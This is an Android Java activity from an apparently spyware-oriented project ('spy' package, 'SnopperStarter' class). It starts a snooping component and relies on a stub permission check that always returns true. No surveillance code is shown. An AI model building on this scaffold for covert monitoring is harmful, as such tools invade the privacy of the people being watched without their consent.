package com.gameofcoding.spy.activities;

import android.app.Activity;
import android.os.Bundle;
import com.gameofcoding.spy.R;
import com.gameofcoding.spy.utils.XLog;
import com.gameofcoding.spy.spys.SnopperStarter;

public class SnopperStarterActivity extends Activity {
    private static final String TAG = "SnopperStarterActivity";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_spystarter);
	if(grantAllPermissions()) {
	    XLog.d(TAG, "All permissions granted, directly starting 'SnopperStarter'");
	    new SnopperStarter(this).start();
	} else {
	    XLog.d(TAG, "All permissions are not granted, waiting when user grants them.");
	}
    }

    public boolean grantAllPermissions() {
	// Code of this will be in another branch
	return true;
    }
}
